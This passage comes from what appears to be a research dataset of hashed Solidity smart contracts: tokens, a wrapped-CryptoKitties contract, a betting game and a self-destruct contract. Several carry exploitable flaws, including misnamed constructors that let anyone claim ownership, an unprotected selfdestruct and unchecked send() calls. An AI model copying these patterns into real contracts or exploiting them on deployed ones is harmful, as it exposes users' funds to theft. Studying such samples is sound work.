    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function totalSupply() external view returns (uint256);
    function balanceOf(address who) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}
contract ERC20 is IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowed;
    uint256 private _totalSupply;
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address owner) public view returns (uint256) {
        return _balances[owner];
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowed[owner][spender];
    }
    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }
    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        _allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);
        _transfer(from, to, value);
        emit Approval(from, msg.sender, _allowed[from][msg.sender]);
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        _allowed[msg.sender][spender] = _allowed[msg.sender][spender].add(addedValue);
        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        _allowed[msg.sender][spender] = _allowed[msg.sender][spender].sub(subtractedValue);
        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
        return true;
    }
    function _transfer(address from, address to, uint256 value) internal {
        require(to != address(0));
        _balances[from] = _balances[from].sub(value);
        _balances[to] = _balances[to].add(value);
        emit Transfer(from, to, value);
    }
    function _mint(address account, uint256 value) internal {
        require(account != address(0));
        _totalSupply = _totalSupply.add(value);
        _balances[account] = _balances[account].add(value);
        emit Transfer(address(0), account, value);
    }
    function _burn(address account, uint256 value) internal {
        require(account != address(0));
        _totalSupply = _totalSupply.sub(value);
        _balances[account] = _balances[account].sub(value);
        emit Transfer(account, address(0), value);
    }
    function _burnFrom(address account, uint256 value) internal {
        _allowed[account][msg.sender] = _allowed[account][msg.sender].sub(value);
        _burn(account, value);
        emit Approval(account, msg.sender, _allowed[account][msg.sender]);
    }
}
contract ReentrancyGuard {
    uint256 private _guardCounter;
    constructor() public {
        _guardCounter = 1;
    }
    modifier nonReentrant() {
        _guardCounter += 1;
        uint256 localCounter = _guardCounter;
        _;
        require(localCounter == _guardCounter);
    }
}
contract WrappedCKG0 is ERC20, ReentrancyGuard {
    using SafeMath for uint256;
    event DepositKittyAndMintToken(
        uint256 kittyId
    );
    event BurnTokenAndWithdrawKitty(
        uint256 kittyId
    );
    uint256[] private depositedKittiesArray;
    mapping (uint256 => bool) private kittyIsDepositedInContract;
    uint8 constant public decimals = 18;
    string constant public name = "Wrapped Gen0 CK";
    string constant public symbol = "WG0";
    address public kittyCoreAddress = 0x06012c8cf97BEaD5deAe237070F9587f8E7A266d;
    KittyCore kittyCore;
    function depositKittiesAndMintTokens(uint256[] calldata _kittyIds) external nonReentrant {
        require(_kittyIds.length > 0, 'you must submit an array with at least one element');
        for(uint i = 0; i < _kittyIds.length; i++){
            uint256 kittyToDeposit = _kittyIds[i];
            require(msg.sender == kittyCore.ownerOf(kittyToDeposit), 'you do not own this cat');
            require(kittyCore.kittyIndexToApproved(kittyToDeposit) == address(this), 'you must approve() this contract to give it permission to withdraw this cat before you can deposit a cat');
            require(kittyCore.getKitty(kittyToDeposit) == 1, 'this cat must be gen1');
            kittyCore.transferFrom(msg.sender, address(this), kittyToDeposit);
            _pushKitty(kittyToDeposit);
            emit DepositKittyAndMintToken(kittyToDeposit);
        }
        _mint(msg.sender, (_kittyIds.length).mul(10**18));
    }
    function burnTokensAndWithdrawKitties(uint256[] calldata _kittyIds, address[] calldata _destinationAddresses) external nonReentrant {
        require(_kittyIds.length == _destinationAddresses.length, 'you did not provide a destination address for each of the cats you wish to withdraw');
        require(_kittyIds.length > 0, 'you must submit an array with at least one element');
        uint256 numTokensToBurn = _kittyIds.length;
        require(balanceOf(msg.sender) >= numTokensToBurn.mul(10**18), 'you do not own enough tokens to withdraw this many ERC721 cats');
        _burn(msg.sender, numTokensToBurn.mul(10**18));
        for(uint i = 0; i < numTokensToBurn; i++){
            uint256 kittyToWithdraw = _kittyIds[i];
            if(kittyToWithdraw == 0){
                kittyToWithdraw = _popKitty();
            } else {
                require(kittyIsDepositedInContract[kittyToWithdraw] == true, 'this kitty has already been withdrawn');
                require(address(this) == kittyCore.ownerOf(kittyToWithdraw), 'the contract does not own this cat');
                kittyIsDepositedInContract[kittyToWithdraw] = false;
            }
            kittyCore.transfer(_destinationAddresses[i], kittyToWithdraw);
            emit BurnTokenAndWithdrawKitty(kittyToWithdraw);
        }
    }
    function _pushKitty(uint256 _kittyId) internal {
        depositedKittiesArray.push(_kittyId);
        kittyIsDepositedInContract[_kittyId] = true;
    }
    function _popKitty() internal returns(uint256){
        require(depositedKittiesArray.length > 0, 'there are no cats in the array');
        uint256 kittyId = depositedKittiesArray[depositedKittiesArray.length - 1];
        depositedKittiesArray.length--;
        while(kittyIsDepositedInContract[kittyId] == false){
            kittyId = depositedKittiesArray[depositedKittiesArray.length - 1];
            depositedKittiesArray.length--;
        }
        kittyIsDepositedInContract[kittyId] = false;
        return kittyId;
    }
    function batchRemoveWithdrawnKittiesFromStorage(uint256 _numSlotsToCheck) external {
        require(_numSlotsToCheck <= depositedKittiesArray.length, 'you are trying to batch remove more slots than exist in the array');
        uint256 arrayIndex = depositedKittiesArray.length;
        for(uint i = 0; i < _numSlotsToCheck; i++){
            arrayIndex = arrayIndex.sub(1);
            uint256 kittyId = depositedKittiesArray[arrayIndex];
            if(kittyIsDepositedInContract[kittyId] == false){
                depositedKittiesArray.length--;
            } else {
                return;
            }
        }
    }
    constructor() public {
        kittyCore = KittyCore(kittyCoreAddress);
    }
    function() external payable {}
}
contract KittyCore {
    function ownerOf(uint256 _tokenId) public view returns (address owner);
    function transferFrom(address _from, address _to, uint256 _tokenId) external;
    function transfer(address _to, uint256 _tokenId) external;
    function getKitty(uint256 _id) public view returns (uint256 _generation);
    mapping (uint256 => address) public kittyIndexToApproved;
}
```

## RQ1_47d903b24246

SHA-256 `7cc94e2d57bad7d6c5cb47a67f0e6b46259ceff37ba797a9f29d7754cf54c812`

```solidity
pragma solidity ^0.4.24;
contract Matthew {
    address owner;
    address whale;
    uint256 blockheight;
    uint256 period = 40; 
    uint constant DELTA = 0.1 ether;
    uint constant WINNERTAX_PRECENT = 10;
    bool mustBeDestroyed = false;
    uint newPeriod = period;
    event MatthewWon(string msg, address winner, uint value,  uint blocknumber);
    event StakeIncreased(string msg, address staker, uint value, uint blocknumber);
    function Matthew(){
        owner = msg.sender;
        setFacts();
    }
    function setFacts() private {
        period = newPeriod;
        blockheight = block.number;
        whale = msg.sender;
    }
    function () payable{
        if (block.number - period >= blockheight){ 
            bool isSuccess=false; 
            var nextStake = this.balance * WINNERTAX_PRECENT/100;  
            if (isSuccess == false) 
                isSuccess = whale.send(this.balance - nextStake); 
            MatthewWon("Matthew won", whale, this.balance, block.number);
            setFacts();
            if (mustBeDestroyed) selfdestruct(whale); 
            return;
        }else{ 
            if (msg.value < this.balance + DELTA) throw; 
            bool isOtherSuccess = msg.sender.send(this.balance); 
            setFacts(); 
            StakeIncreased("stake increased", whale, this.balance, blockheight);
        }
    }
    function destroyWhenRoundOver() onlyOwner{
        mustBeDestroyed = true;
    }
    function setNewPeriod(uint _newPeriod) onlyOwner{
        newPeriod = _newPeriod;
    }
    function getPeriod() constant returns (uint){
        return period;
    }
    function getNewPeriod() constant returns (uint){
        return newPeriod;
    }
    function getDestroyedWhenRoundOver() constant returns (bool){
        return mustBeDestroyed;
    }
    function getBlocksTillMatthew() public constant returns(uint){
        if (blockheight + period > block.number)
            return blockheight + period - block.number;
        else
            return 0;
    }
    modifier onlyOwner(){
        if (msg.sender != owner) throw;
        _;
    }
}

```

## RQ1_afa801e14aca

SHA-256 `f3f6801bd64368d43cccc4ebd3af093530f1598c7a7b5c1218daa3c42eba75a6`

```solidity
pragma solidity ^0.4.18;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract ForeignToken {
    function balanceOf(address _owner) constant public returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
}
contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface Token { 
    function distr(address _to, uint256 _value) public returns (bool);
    function totalSupply() constant public returns (uint256 supply);
    function balanceOf(address _owner) constant public returns (uint256 balance);
}
contract BFTToken is ERC20 {
    using SafeMath for uint256;
    address owner = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    mapping (address => bool) public blacklist;
    string public constant name = "Burma first token";
    string public constant symbol = "BFT";
    uint public constant decimals = 8;
    uint256 public totalSupply = 1000000000e8;
    uint256 public totalDistributed = 300000000e8;
    uint256 public totalRemaining = totalSupply.sub(totalDistributed);
    uint256 public value;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Distr(address indexed to, uint256 amount);
    event DistrFinished();
    event Burn(address indexed burner, uint256 value);
    bool public distributionFinished = false;
    modifier canDistr() {
        require(!distributionFinished);
        _;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier onlyWhitelist() {
        require(blacklist[msg.sender] == false);
        _;
    }
    function QMQCoin () public {
        owner = msg.sender;
        value = 5000e8;
        distr(owner, totalDistributed);
    }
    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
    function enableWhitelist(address[] addresses) onlyOwner public {
        for (uint i = 0; i < addresses.length; i++) {
            blacklist[addresses[i]] = false;
        }
    }
    function disableWhitelist(address[] addresses) onlyOwner public {
        for (uint i = 0; i < addresses.length; i++) {
            blacklist[addresses[i]] = true;
        }
    }
    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = true;
        DistrFinished();
        return true;
    }
    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);
        totalRemaining = totalRemaining.sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Distr(_to, _amount);
        Transfer(address(0), _to, _amount);
        return true;
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function airdrop(address[] addresses) onlyOwner canDistr public {
        require(addresses.length <= 255);
        require(value <= totalRemaining);
        for (uint i = 0; i < addresses.length; i++) {
            require(value <= totalRemaining);
            distr(addresses[i], value);
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function distribution(address[] addresses, uint256 amount) onlyOwner canDistr public {
        require(addresses.length <= 255);
        require(amount <= totalRemaining);
        for (uint i = 0; i < addresses.length; i++) {
            require(amount <= totalRemaining);
            distr(addresses[i], amount);
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function distributeAmounts(address[] addresses, uint256[] amounts) onlyOwner canDistr public {
        require(addresses.length <= 255);
        require(addresses.length == amounts.length);
        for (uint8 i = 0; i < addresses.length; i++) {
            require(amounts[i] <= totalRemaining);
            distr(addresses[i], amounts[i]);
            if (totalDistributed >= totalSupply) {
                distributionFinished = true;
            }
        }
    }
    function () external payable {
            getTokens();
     }
    function getTokens() payable canDistr onlyWhitelist public {
        if (value > totalRemaining) {
            value = totalRemaining;
        }
        require(value <= totalRemaining);
        address investor = msg.sender;
        uint256 toGive = value;
        distr(investor, toGive);
        if (toGive > 0) {
            blacklist[investor] = true;
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
        value = value.div(100000).mul(99999);
    }
    function balanceOf(address _owner) constant public returns (uint256) {
	    return balances[_owner];
    }
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }
    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(msg.sender, _to, _amount);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        ForeignToken t = ForeignToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }
    function withdraw() onlyOwner public {
        uint256 etherBalance = this.balance;
        owner.transfer(etherBalance);
    }
    function burn(uint256 _value) onlyOwner public {
        require(_value <= balances[msg.sender]);
        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
        Burn(burner, _value);
    }
    function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {
        ForeignToken token = ForeignToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        require(_spender.call(bytes4(bytes32(keccak256("receiveApproval(address,uint256,address,bytes)"))), msg.sender, _value, this, _extraData));
        return true;
    }
}
```

## RQ1_84691b172f26

SHA-256 `24f5a6195046ae000c2a5881e52e6ad1a86322070cafa56551f7d8b5efd4ca35`

```solidity
pragma solidity ^0.4.18; 
contract ERC721 {
  function approve(address _to, uint256 _tokenId) public;
  function balanceOf(address _owner) public view returns (uint256 balance);
  function implementsERC721() public pure returns (bool);
  function ownerOf(uint256 _tokenId) public view returns (address addr);
  function takeOwnership(uint256 _tokenId) public;
  function totalSupply() public view returns (uint256 total);
  function transferFrom(address _from, address _to, uint256 _tokenId) public;
  function transfer(address _to, uint256 _tokenId) public;
  event Transfer(address indexed from, address indexed to, uint256 tokenId);
  event Approval(address indexed owner, address indexed approved, uint256 tokenId);
}
contract CryptoOscarsToken is ERC721 {
  event Birth(uint256 tokenId, string name, address owner);
  event TokenSold(uint256 tokenId, uint256 oldPrice, uint256 newPrice, address prevOwner, address winner, string name);
  event Transfer(address from, address to, uint256 tokenId);
  string public constant NAME = "CryptoOscars"; 
  string public constant SYMBOL = "CryptoOscarsToken"; 
  uint256 private startingPrice = 0.001 ether;
  uint256 private constant PROMO_CREATION_LIMIT = 20000;
  mapping (uint256 => address) public movieIndexToOwner;
  mapping (address => uint256) private ownershipTokenCount;
  mapping (uint256 => address) public movieIndexToApproved;
  mapping (uint256 => uint256) private movieIndexToPrice;
  address public ceoAddress;
  address public cooAddress;
  uint256 public promoCreatedCount;
  struct Movie {
    string name;
  }
  Movie[] private movies;
  modifier onlyCEO() {
    require(msg.sender == ceoAddress);
    _;
  }
  modifier onlyCOO() {
    require(msg.sender == cooAddress);
    _;
  }
  modifier onlyCLevel() {
    require(
      msg.sender == ceoAddress ||
      msg.sender == cooAddress
    );
    _;
  }
  function CryptoMoviesToken() public {
    ceoAddress = msg.sender;
    cooAddress = msg.sender;
  }
  function approve(address _to, uint256 _tokenId) public {
    require(_owns(msg.sender, _tokenId));
    movieIndexToApproved[_tokenId] = _to;
    Approval(msg.sender, _to, _tokenId);
  }
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return ownershipTokenCount[_owner];
  }
  function createPromoMovie(address _owner, string _name, uint256 _price) public onlyCOO {
    require(promoCreatedCount < PROMO_CREATION_LIMIT);
    address movieOwner = _owner;
    if (movieOwner == address(0)) {
      movieOwner = cooAddress;
    }
    if (_price <= 0) {
      _price = startingPrice;
    }
    promoCreatedCount++;
    _createMovie(_name, movieOwner, _price);
  }
  function createContractMovie(string _name) public onlyCOO {
    _createMovie(_name, address(this), startingPrice);
  }
  function getMovie(uint256 _tokenId) public view returns (
    string movieName,
    uint256 sellingPrice,
    address owner
  ) {
    Movie storage movie = movies[_tokenId];
    movieName = movie.name;
    sellingPrice = movieIndexToPrice[_tokenId];
    owner = movieIndexToOwner[_tokenId];
  }
  function implementsERC721() public pure returns (bool) {
    return true;
  }
  function name() public pure returns (string) {
    return NAME;
  }
  function ownerOf(uint256 _tokenId)
    public
    view
    returns (address owner)
  {
    owner = movieIndexToOwner[_tokenId];
    require(owner != address(0));
  }
  function payout(address _to) public onlyCLevel {
    _payout(_to);
  }
  function purchase(uint256 _tokenId) public payable {
    address oldOwner = movieIndexToOwner[_tokenId];
    address newOwner = msg.sender;
    uint256 sellingPrice = movieIndexToPrice[_tokenId];
    require(oldOwner != newOwner);
    require(_addressNotNull(newOwner));
    require(msg.value >= sellingPrice);
    uint256 payment = uint256(SafeMath.div(SafeMath.mul(sellingPrice, 80), 100));
    uint256 purchaseExcess = SafeMath.sub(msg.value, sellingPrice);
    movieIndexToPrice[_tokenId] = SafeMath.div(SafeMath.mul(sellingPrice, 150), 80);
    _transfer(oldOwner, newOwner, _tokenId);
    if (oldOwner != address(this)) {
      oldOwner.transfer(payment);
    }
    TokenSold(_tokenId, sellingPrice, movieIndexToPrice[_tokenId], oldOwner, newOwner, movies[_tokenId].name);
    msg.sender.transfer(purchaseExcess);
  }
  function priceOf(uint256 _tokenId) public view returns (uint256 price) {
    return movieIndexToPrice[_tokenId];
  }
  function setCEO(address _newCEO) public onlyCEO {
    require(_newCEO != address(0));
    ceoAddress = _newCEO;
  }
  function setCOO(address _newCOO) public onlyCEO {
    require(_newCOO != address(0));
    cooAddress = _newCOO;
  }
  function symbol() public pure returns (string) {
    return SYMBOL;
  }
  function takeOwnership(uint256 _tokenId) public {
    address newOwner = msg.sender;
    address oldOwner = movieIndexToOwner[_tokenId];
    require(_addressNotNull(newOwner));
    require(_approved(newOwner, _tokenId));
    _transfer(oldOwner, newOwner, _tokenId);
  }
  function tokensOfOwner(address _owner) public view returns(uint256[] ownerTokens) {
    uint256 tokenCount = balanceOf(_owner);
    if (tokenCount == 0) {
      return new uint256[](0);
    } else {
      uint256[] memory result = new uint256[](tokenCount);
      uint256 totalMovies = totalSupply();
      uint256 resultIndex = 0;
      uint256 movieId;
      for (movieId = 0; movieId <= totalMovies; movieId++) {
        if (movieIndexToOwner[movieId] == _owner) {
          result[resultIndex] = movieId;
          resultIndex++;
        }
      }
      return result;
    }
  }
  function totalSupply() public view returns (uint256 total) {
    return movies.length;
  }
  function transfer(address _to, uint256 _tokenId) public {
    require(_owns(msg.sender, _tokenId));
    require(_addressNotNull(_to));
    _transfer(msg.sender, _to, _tokenId);
  }
  function transferFrom(address _from, address _to, uint256 _tokenId) public {
    require(_owns(_from, _tokenId));
    require(_approved(_to, _tokenId));
    require(_addressNotNull(_to));
    _transfer(_from, _to, _tokenId);
  }
  function _addressNotNull(address _to) private pure returns (bool) {
    return _to != address(0);
  }
  function _approved(address _to, uint256 _tokenId) private view returns (bool) {
    return movieIndexToApproved[_tokenId] == _to;
  }
  function _createMovie(string _name, address _owner, uint256 _price) private {
    Movie memory _movie = Movie({
      name: _name
    });
    uint256 newMovieId = movies.push(_movie) - 1;
    require(newMovieId == uint256(uint32(newMovieId)));
    Birth(newMovieId, _name, _owner);
    movieIndexToPrice[newMovieId] = _price;
    _transfer(address(0), _owner, newMovieId);
  }
  function _owns(address claimant, uint256 _tokenId) private view returns (bool) {
    return claimant == movieIndexToOwner[_tokenId];
  }
  function _payout(address _to) private {
    if (_to == address(0)) {
      ceoAddress.transfer(this.balance);
    } else {
      _to.transfer(this.balance);
    }
  }
  function _transfer(address _from, address _to, uint256 _tokenId) private {
    ownershipTokenCount[_to]++;
    movieIndexToOwner[_tokenId] = _to;
    if (_from != address(0)) {
      ownershipTokenCount[_from]--;
      delete movieIndexToApproved[_tokenId];
    }
    Transfer(_from, _to, _tokenId);
  }
}
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
```

## RQ1_11b39eaea9ae

SHA-256 `f00a6c3126c2c6e816b33cd1fa550695d3a963499f6dd92edabee9d36a030129`

```solidity
pragma solidity ^0.4.25;
contract etherSinkhole{
    constructor() public{}
    function destroy() public{
        selfdestruct(msg.sender);
    }
}
```

## RQ1_cec6d28cb95d

SHA-256 `c2e9a0e7c4ae255949876e3f2308d98202f0535730bee3091113cd9c83beed25`

```solidity
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a);
        c = a - b;
    }
    function safeMul(uint a, uint b) public pure returns (uint c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }
    function safeDiv(uint a, uint b) public pure returns (uint c) {
        require(b > 0);
        c = a / b;
    }
}
contract ERC20Interface {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);
    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}
contract ApproveAndCallFallBack {
    function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}
contract Owned {
    address public owner;
    address public newOwner;
    event OwnershipTransferred(address indexed _from, address indexed _to);
    function Owned2() public {
        owner = msg.sender;
    }
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    function transferOwnership(address _newOwner) public onlyOwner {
        newOwner = _newOwner;
    }
    function acceptOwnership() public {
        require(msg.sender == newOwner);
        OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
    }
}
contract TEW is ERC20Interface, Owned, SafeMath {
    string public symbol;
    string public  name;
    uint8 public decimals;
    uint public _totalSupply;
    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;
    function TEW() public {
        symbol = "TEW";
        name = "tianewan";
        decimals = 2;
        _totalSupply = 	100000000000000;
        balances[0xd7043B389863851b97c8bE076a72d046f851BCB0] = _totalSupply;
        Transfer(address(0), 0xd7043B389863851b97c8bE076a72d046f851BCB0, _totalSupply);
    }
    function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }
    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }
    function transfer(address to, uint tokens) public returns (bool success) {
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        Transfer(msg.sender, to, tokens);
        return true;
    }
    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        Approval(msg.sender, spender, tokens);
        return true;
    }
    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        balances[from] = safeSub(balances[from], tokens);
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        Transfer(from, to, tokens);
        return true;
    }
    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }
    function approveAndCall(address spender, uint tokens, bytes data) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        Approval(msg.sender, spender, tokens);
        ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, this, data);
        return true;
    }
    function () public payable {
        revert();
    }
    function transferAnyERC20Token(address tokenAddress, uint tokens) public onlyOwner returns (bool success) {
        return ERC20Interface(tokenAddress).transfer(owner, tokens);
    }
}
```

## RQ1_7ecffa90731f

SHA-256 `ca3e459e5e36f4dd2522e5e8bb2ca65f26e44cc176215f3fbd809b73130f56f6`

```solidity
pragma solidity 0.5.8;
contract RegistryICAPInterface {
    function parse(bytes32 _icap) public view returns(address, bytes32, bool);
    function institutions(bytes32 _institution) public view returns(address);
}
contract EToken2Interface {
    function registryICAP() public view returns(RegistryICAPInterface);
    function baseUnit(bytes32 _symbol) public view returns(uint8);
    function description(bytes32 _symbol) public view returns(string memory);
    function owner(bytes32 _symbol) public view returns(address);
    function isOwner(address _owner, bytes32 _symbol) public view returns(bool);
    function totalSupply(bytes32 _symbol) public view returns(uint);
    function balanceOf(address _holder, bytes32 _symbol) public view returns(uint);
    function isLocked(bytes32 _symbol) public view returns(bool);
    function issueAsset(
        bytes32 _symbol,
        uint _value,
        string memory _name,
        string memory _description,
        uint8 _baseUnit,
        bool _isReissuable)
    public returns(bool);
    function reissueAsset(bytes32 _symbol, uint _value) public returns(bool);
    function revokeAsset(bytes32 _symbol, uint _value) public returns(bool);
    function setProxy(address _address, bytes32 _symbol) public returns(bool);
    function lockAsset(bytes32 _symbol) public returns(bool);
    function proxyTransferFromToICAPWithReference(
        address _from,
        bytes32 _icap,
        uint _value,
        string memory _reference,
        address _sender)
    public returns(bool);
    function proxyApprove(address _spender, uint _value, bytes32 _symbol, address _sender)
    public returns(bool);
    function allowance(address _from, address _spender, bytes32 _symbol) public view returns(uint);
    function proxyTransferFromWithReference(
        address _from,
        address _to,
        uint _value,
        bytes32 _symbol,
        string memory _reference,
        address _sender)
    public returns(bool);
    function changeOwnership(bytes32 _symbol, address _newOwner) public returns(bool);
}
pragma solidity 0.5.8;
contract AssetInterface {
    function _performTransferWithReference(
        address _to,
        uint _value,
        string memory _reference,
        address _sender)
    public returns(bool);
    function _performTransferToICAPWithReference(
        bytes32 _icap,
        uint _value,
        string memory _reference,
        address _sender)
    public returns(bool);
    function _performApprove(address _spender, uint _value, address _sender)
    public returns(bool);
    function _performTransferFromWithReference(
        address _from,
        address _to,
        uint _value,
        string memory _reference,
        address _sender)
    public returns(bool);
    function _performTransferFromToICAPWithReference(
        address _from,
        bytes32 _icap,
        uint _value,
        string memory _reference,
        address _sender)
    public returns(bool);
    function _performGeneric(bytes memory, address) public payable {
        revert();
    }
}
pragma solidity 0.5.8;
contract ERC20Interface {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed from, address indexed spender, uint256 value);
    function totalSupply() public view returns(uint256 supply);
    function balanceOf(address _owner) public view returns(uint256 balance);
    function transfer(address _to, uint256 _value) public returns(bool success);
    function transferFrom(address _from, address _to, uint256 _value) public returns(bool success);
    function approve(address _spender, uint256 _value) public returns(bool success);
    function allowance(address _owner, address _spender) public view returns(uint256 remaining);
    function decimals() public view returns(uint8);
}
pragma solidity 0.5.8;
contract AssetProxyInterface is ERC20Interface {
    function _forwardApprove(address _spender, uint _value, address _sender)
    public returns(bool);
    function _forwardTransferFromWithReference(
        address _from,
        address _to,
        uint _value,
        string memory _reference,
        address _sender)
    public returns(bool);
    function _forwardTransferFromToICAPWithReference(
        address _from,
        bytes32 _icap,
        uint _value,
        string memory _reference,
        address _sender)
    public returns(bool);
    function recoverTokens(ERC20Interface _asset, address _receiver, uint _value)
    public returns(bool);
    function etoken2() external view returns(address); 
    function etoken2Symbol() external view returns(bytes32);
}
pragma solidity 0.5.8;
contract Bytes32 {
    function _bytes32(string memory _input) internal pure returns(bytes32 result) {
        assembly {
            result := mload(add(_input, 32))
        }
    }
}
pragma solidity 0.5.8;
contract ReturnData {
    function _returnReturnData(bool _success) internal pure {
        assembly {
            let returndatastart := 0
            returndatacopy(returndatastart, 0, returndatasize)
